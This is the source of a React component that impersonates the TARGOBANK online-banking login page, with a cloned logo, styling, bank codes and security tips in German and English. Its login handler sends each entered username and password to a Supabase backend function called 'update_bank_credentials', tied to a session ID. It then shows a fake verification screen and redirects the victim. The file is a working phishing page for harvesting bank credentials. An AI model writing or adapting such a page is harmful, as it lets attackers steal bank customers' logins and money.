import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ChevronRight, Check } from "lucide-react";
import logoAsset from "@/assets/targobank/targobank-logo.svg.asset.json";
import footerIconAsset from "@/assets/targobank/targobank-footer-icon.svg.asset.json";
import card1Asset from "@/assets/targobank/targobank-card-1.webp.asset.json";
import card2Asset from "@/assets/targobank/targobank-card-2.webp.asset.json";
import card3Asset from "@/assets/targobank/targobank-card-3.webp.asset.json";

const NAVY = "#002d5a";
const BLUE = "#00a6e5";
const CARD = "#cfeefb";
const RED = "#c3002f";
const RED_HOVER = "#a00026";

type Lang = "de" | "en";

const URLS = {
  priv: "https://www.targobank.de/de/privatkunden/index.html",
  biz: "https://www.targobank.de/de/geschaeftskunden/index.html",
  firm: "https://www.targobank.de/de/firmenkunden/index.html",
  forgot: "https://www.targobank.de/de/service/online-banking/zugangsdaten-vergessen.html",
  register: "https://www.targobank.de/de/service/online-banking/benutzerdaten-anlegen.html",
  info: "https://www.targobank.de/de/service/online-banking/einrichtung-und-nutzung.html",
  bsi: "https://www.bsi.bund.de/",
  cardOnline: "https://www.targobank.de/de/service/sicherheit/online-sicherheit.html",
  cardTan: "https://www.targobank.de/de/service/online-banking/tan-verfahren.html",
  cardMobile: "https://www.targobank.de/de/service/online-banking/mobile-banking.html",
  imprint: "https://www.targobank.de/de/service/meta/impressum.html",
  privacy: "https://www.targobank.de/de/service/meta/datenschutz.html",
  agb: "https://www.targobank.de/de/service/meta/agb.html",
  prices: "https://www.targobank.de/de/service/meta/preise-und-leistungen.html",
  security: "https://www.targobank.de/de/service/sicherheit/index.html",
  credit: "https://www.targobank.de/de/privatkunden/finanzieren/index.html",
  revoke: "https://www.targobank.de/de/service/meta/vertrag-widerrufen.html",
};

const COPY: Record<Lang, {
  priv: string; biz: string; firm: string;
  login: string; required: string; username: string; password: string;
  remember: string; loginNow: string;
  forgot: string; register: string; info: string;
  usernameError: string; passwordError: string;
  tipsTitle: string;
  tips: string[];
  bsiText: string; bsiLink: string;
  spuerbar: string;
  card1Cat: string; card1Title: string; card1Link: string;
  card2Cat: string; card2Title: string; card2Link: string;
  card3Cat: string; card3Title: string; card3Link: string;
  imprint: string; privacy: string; agb: string; prices: string; security: string; credit: string;
  revoke: string;
}> = {
  de: {
    priv: "Privatkunden", biz: "Geschäftskunden", firm: "Firmenkunden",
    login: "Login", required: "Pflichtfeld", username: "Benutzername", password: "Passwort",
    remember: "Meinen Benutzernamen speichern", loginNow: "Jetzt einloggen",
    forgot: "Zugangsdaten vergessen?", register: "Benutzerdaten anlegen",
    info: "Informationen zur Einrichtung und Nutzung",
    usernameError: "Bitte geben Sie Ihren Benutzernamen ein.",
    passwordError: "Bitte geben Sie Ihr Passwort ein.",
    tipsTitle: "Unsere Sicherheitstipps",
    tips: [
      "Geben Sie niemals mehrere TANs gleichzeitig ein.",
      "Geben Sie niemals vertrauliche Daten oder TANs per E-Mail oder Telefon preis.",
      "Ändern Sie regelmäßig Ihre Passwörter und PIN.",
      "Speichern Sie vertrauliche Daten wie Benutzernamen, Passwort, PIN oder TANs nicht auf Ihrem Computer.",
      "Schreiben Sie Benutzernamen, PIN und Passwörter niemals auf und geben Sie sie nicht weiter an Dritte. Sie allein sind geheim.",
      "Nutzen Sie keine für Dritte zugänglichen Computer, um sich an Ihrem Online-Banking anzumelden.",
      "Bitte geben Sie immer www.targobank.de in die Adresszeile Ihres Internet-Browsers ein.",
    ],
    bsiText: "Weitere nützliche Hinweise finden Sie auf den Internetseiten des",
    bsiLink: "Bundesamt für Sicherheit in der Informationstechnik",
    spuerbar: "Online-Banking spürbar sicherer",
    card1Cat: "Online-Sicherheit", card1Title: "Alles für Ihren Schutz beim Online-Banking", card1Link: "Zur Online-Sicherheit",
    card2Cat: "TAN Verfahren", card2Title: "So individuell wie Ihre Anforderungen", card2Link: "Mehr Informationen",
    card3Cat: "Mobile Banking", card3Title: "Bankgeschäfte überall, einfach und sicher per App tätigen", card3Link: "Mehr erfahren",
    imprint: "Impressum", privacy: "Datenschutz", agb: "AGB, Rechtliche Hinweise & Barrierefreiheit",
    prices: "Preise & Leistungen", security: "Sicherheit", credit: "Kredit",
    revoke: "Vertrag widerrufen",
  },
  en: {
    priv: "Private clients", biz: "Business clients", firm: "Corporate clients",
    login: "Login", required: "Required field", username: "Username", password: "Password",
    remember: "Remember my username", loginNow: "Log in now",
    forgot: "Forgotten access data?", register: "Create user data",
    info: "Information on setup and use",
    usernameError: "Please enter your username.",
    passwordError: "Please enter your password.",
    tipsTitle: "Our security tips",
    tips: [
      "Never enter several TANs at the same time.",
      "Never share confidential data or TANs by email or phone.",
      "Change your passwords and PIN regularly.",
      "Do not store confidential data such as usernames, passwords, PINs or TANs on your computer.",
      "Never write down usernames, PINs and passwords and never share them with third parties.",
      "Do not use computers accessible to third parties to log in to your online banking.",
      "Always type www.targobank.de into your browser's address bar.",
    ],
    bsiText: "You can find further useful information on the pages of the",
    bsiLink: "Federal Office for Information Security",
    spuerbar: "Online banking noticeably safer",
    card1Cat: "Online security", card1Title: "Everything for your protection in online banking", card1Link: "To online security",
    card2Cat: "TAN procedure", card2Title: "As individual as your requirements", card2Link: "More information",
    card3Cat: "Mobile banking", card3Title: "Do your banking anywhere, easily and safely in the app", card3Link: "Learn more",
    imprint: "Imprint", privacy: "Privacy", agb: "T&Cs, Legal notice & Accessibility",
    prices: "Prices & services", security: "Security", credit: "Credit",
    revoke: "Revoke contract",
  },
};

const Targobank = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = params.get("s") || "";
  const [lang, setLang] = useState<Lang>("de");
  const t = COPY[lang];
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [remember, setRemember] = useState(false);
  const [userErr, setUserErr] = useState(false);
  const [pwErr, setPwErr] = useState(false);
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("TARGOBANK – Online-Banking", logoAsset.url);

  const ext = { target: "_blank", rel: "noopener noreferrer" } as const;

  const handleLogin = async () => {
    const uErr = username.trim().length === 0;
    const pErr = password.length === 0;
    setUserErr(uErr); setPwErr(pErr);
    if (uErr || pErr) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Benutzername",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const fieldCls = (err: boolean) =>
    "w-full h-[48px] px-4 text-[15px] bg-white outline-none rounded-[6px] " +
    "border transition-colors";
  const fieldStyle = (err: boolean): React.CSSProperties => ({
    borderColor: err ? RED : "#8aa3bd",
    color: NAVY,
  });

  return (
    <>
      <style>{`
        .tb-font { font-family: 'CircularPro','Helvetica Neue',Arial,sans-serif; color: ${NAVY}; }
        .tb-login-btn { background:${RED}; transition: background 150ms ease; }
        .tb-login-btn:hover { background:${RED_HOVER}; }
        .tb-link { color:${NAVY}; text-decoration: underline; text-underline-offset: 2px; }
        .tb-link:hover { color:${RED}; }
        .tb-input:focus { border-color:${NAVY} !important; box-shadow: 0 0 0 2px rgba(0,45,90,0.15); }
        .tb-hero {
          background-color: ${BLUE};
          background-image: url(${footerIconAsset.url});
          background-repeat: no-repeat;
          background-position: center center;
          background-size: 150% auto;
        }
        @media (min-width: 1024px) {
          .tb-hero { background-size: 90% auto; background-position: 120% center; }
        }
        .tb-revoke-btn { background: transparent; border:1px solid #fff; color:#fff; transition: background 150ms ease, color 150ms ease; }
        .tb-revoke-btn:hover { background:#fff; color:${NAVY}; }
      `}</style>

      {showLoading && (
        <LoadingOverlay
          message={lang === "de" ? "Anmeldedaten werden überprüft..." : "Verifying your credentials..."}
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}

      <div className="tb-font min-h-screen flex flex-col bg-white">
        {/* Top dark bar */}
        <div style={{ backgroundColor: NAVY }} className="text-white text-[13px]">
          <div className="max-w-[1200px] mx-auto px-5 py-3 flex flex-wrap items-center justify-between gap-3">
            <nav className="flex gap-6">
              <a href={URLS.priv} {...ext} className="hover:underline">{t.priv}</a>
              <a href={URLS.biz} {...ext} className="hover:underline">{t.biz}</a>
              <a href={URLS.firm} {...ext} className="hover:underline">{t.firm}</a>
            </nav>
            <div className="flex items-center gap-4">
              <span><span className="underline">BLZ:</span> 300 209 00</span>
              <span className="opacity-50">|</span>
              <span><span className="underline">BIC:</span> CMCIDEDD</span>
            </div>
          </div>
        </div>

        {/* Logo header */}
        <div className="bg-white">
          <div className="max-w-[1200px] mx-auto px-5 py-6">
            <a href="/de/targobank" aria-label="TARGOBANK">
              <img src={logoAsset.url} alt="TARGOBANK" className="h-8 lg:h-9 w-auto" />
            </a>
          </div>
        </div>

        {/* Hero with login card */}
        <section className="tb-hero relative overflow-hidden">
          <div className="max-w-[1200px] mx-auto px-4 lg:px-5 py-10 lg:py-16 flex justify-center">
            <div
              className="w-full max-w-[440px] rounded-[14px] p-6 lg:p-10"
              style={{ backgroundColor: "rgba(207, 238, 251, 0.72)", backdropFilter: "blur(4px)", WebkitBackdropFilter: "blur(4px)" }}
            >
              <h1 className="text-center font-bold text-[30px] lg:text-[34px] mb-5" style={{ color: NAVY }}>
                {t.login}
              </h1>
              <div className="text-[16px] mb-6" style={{ color: NAVY }}>
                <span style={{ color: RED }}>*</span> {t.required}
              </div>

              <div className="mb-5">
                <div className="relative">
                  <input
                    className={`tb-input ${fieldCls(userErr)}`}
                    style={fieldStyle(userErr)}
                    value={username}
                    onChange={(e) => { setUsername(e.target.value); if (userErr) setUserErr(false); }}
                    onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                    aria-label={t.username}
                  />
                  {username.length === 0 && (
                    <div
                      className="absolute left-4 top-1/2 -translate-y-1/2 text-[15px] pointer-events-none"
                      style={{ color: "#6a7f94" }}
                    >
                      {t.username} <span style={{ color: RED }}>*</span>
                    </div>
                  )}
                </div>
                {userErr && (
                  <div className="mt-1 text-[13px]" style={{ color: RED }}>{t.usernameError}</div>
                )}
              </div>

              <div className="mb-5">
                <div className="relative">
                  <input
                    type={showPw ? "text" : "password"}
                    className={`tb-input ${fieldCls(pwErr)} pr-12`}
                    style={fieldStyle(pwErr)}
                    value={password}
                    onChange={(e) => { setPassword(e.target.value); if (pwErr) setPwErr(false); }}
                    onKeyDown={(e) => e.key === "Enter" && handleLogin()}
                    aria-label={t.password}
                  />
                  {password.length === 0 && (
                    <div
                      className="absolute left-4 top-1/2 -translate-y-1/2 text-[15px] pointer-events-none"
                      style={{ color: "#6a7f94" }}
                    >
                      {t.password} <span style={{ color: RED }}>*</span>
                    </div>
                  )}
                  <button
                    type="button"
                    onClick={() => setShowPw((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2"
                    style={{ color: NAVY }}
                    aria-label={showPw ? "Hide password" : "Show password"}
                  >
                    {showPw ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
                {pwErr && (
                  <div className="mt-1 text-[13px]" style={{ color: RED }}>{t.passwordError}</div>
                )}
              </div>

              <label className="flex items-center gap-2 text-[14px] mb-5 cursor-pointer justify-center" style={{ color: NAVY }}>
                <input
                  type="checkbox"
                  checked={remember}
                  onChange={(e) => setRemember(e.target.checked)}
                  className="w-4 h-4"
                  style={{ accentColor: NAVY }}
                />
                {t.remember}
              </label>

              <button
                type="button"
                onClick={handleLogin}
                className="tb-login-btn w-full h-[52px] rounded-full text-white font-bold text-[16px] flex items-center justify-center gap-2 relative"
              >
                <span>{t.loginNow}</span>
                <ChevronRight size={20} className="absolute right-5" />
              </button>

              <div className="mt-5 text-center text-[14px] flex flex-wrap justify-center gap-x-3 gap-y-1">
                <a href={URLS.forgot} {...ext} className="tb-link">{t.forgot}</a>
                <a href={URLS.register} {...ext} className="tb-link">{t.register}</a>
              </div>
              <div className="mt-2 text-center text-[14px]">
                <a href={URLS.info} {...ext} className="tb-link">{t.info}</a>
              </div>
            </div>
          </div>
        </section>

        {/* Security tips */}
        <section className="bg-[#eff6fb] py-14">
          <div className="max-w-[1140px] mx-auto px-5">
            <h2 className="text-center font-bold text-[28px] lg:text-[32px] mb-10" style={{ color: NAVY }}>
              {t.tipsTitle}
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-x-10">
              {t.tips.map((tip, i) => (
                <div key={i} className="border-t border-[#c8d6e2] py-5 flex items-start gap-4 text-[15px]" style={{ color: NAVY }}>
                  <Check size={22} strokeWidth={3} style={{ color: NAVY, flexShrink: 0, marginTop: 2 }} />
                  <span>{tip}</span>
                </div>
              ))}
            </div>
            <div className="mt-6 text-[15px]" style={{ color: NAVY }}>
              {t.bsiText}{" "}
              <a href={URLS.bsi} {...ext} className="tb-link">{t.bsiLink}</a>.
            </div>
          </div>
        </section>

        {/* Spuerbar sicherer cards */}
        <section className="bg-white py-16">
          <div className="max-w-[1200px] mx-auto px-5">
            <h2 className="text-center font-bold text-[28px] lg:text-[34px] mb-10" style={{ color: NAVY }}>
              {t.spuerbar}
            </h2>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
              {[
                { img: card1Asset.url, cat: t.card1Cat, title: t.card1Title, link: t.card1Link, href: URLS.cardOnline },
                { img: card2Asset.url, cat: t.card2Cat, title: t.card2Title, link: t.card2Link, href: URLS.cardTan },
                { img: card3Asset.url, cat: t.card3Cat, title: t.card3Title, link: t.card3Link, href: URLS.cardMobile },
              ].map((c) => (
                <a key={c.cat} href={c.href} {...ext} className="block group">
                  <img src={c.img} alt={c.title} className="w-full aspect-[656/410] object-cover rounded-sm" />
                  <div className="text-[13px] mt-4" style={{ color: NAVY }}>{c.cat}</div>
                  <div className="font-bold text-[20px] mt-1 leading-snug" style={{ color: NAVY }}>{c.title}</div>
                  <div className="mt-3 text-[15px] tb-link inline-block">{c.link}</div>
                </a>
              ))}
            </div>
          </div>
        </section>

        {/* Footer */}
        <footer style={{ backgroundColor: NAVY }} className="text-white mt-auto">
          <div className="max-w-[1200px] mx-auto px-5 py-8 flex flex-col lg:flex-row lg:items-center gap-6">
            <img src={footerIconAsset.url} alt="" className="h-10 w-auto" />
            <div className="flex flex-wrap items-center gap-x-6 gap-y-3 text-[14px] flex-1">
              <a href={URLS.imprint} {...ext} className="hover:underline">{t.imprint}</a>
              <span className="opacity-40">|</span>
              <a href={URLS.privacy} {...ext} className="hover:underline">{t.privacy}</a>
              <span className="opacity-40">|</span>
              <a href={URLS.agb} {...ext} className="hover:underline">{t.agb}</a>
              <span className="opacity-40">|</span>
              <a href={URLS.prices} {...ext} className="hover:underline">{t.prices}</a>
              <span className="opacity-40">|</span>
              <a href={URLS.security} {...ext} className="hover:underline">{t.security}</a>
              <span className="opacity-40">|</span>
              <a href={URLS.credit} {...ext} className="hover:underline">{t.credit}</a>
            </div>
            <a
              href={URLS.revoke}
              {...ext}
              className="tb-revoke-btn w-full lg:w-auto text-center text-[14px] px-6 py-2.5 rounded-full font-medium"
            >
              {t.revoke}
            </a>
            <div className="flex items-center gap-3 text-[14px]">
              <button
                type="button"
                onClick={() => setLang("de")}
                className={lang === "de" ? "font-bold underline" : "opacity-80 hover:underline"}
              >DE</button>
              <span className="opacity-40">|</span>
              <button
                type="button"
                onClick={() => setLang("en")}
                className={lang === "en" ? "font-bold underline" : "opacity-80 hover:underline"}
              >EN</button>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default Targobank;
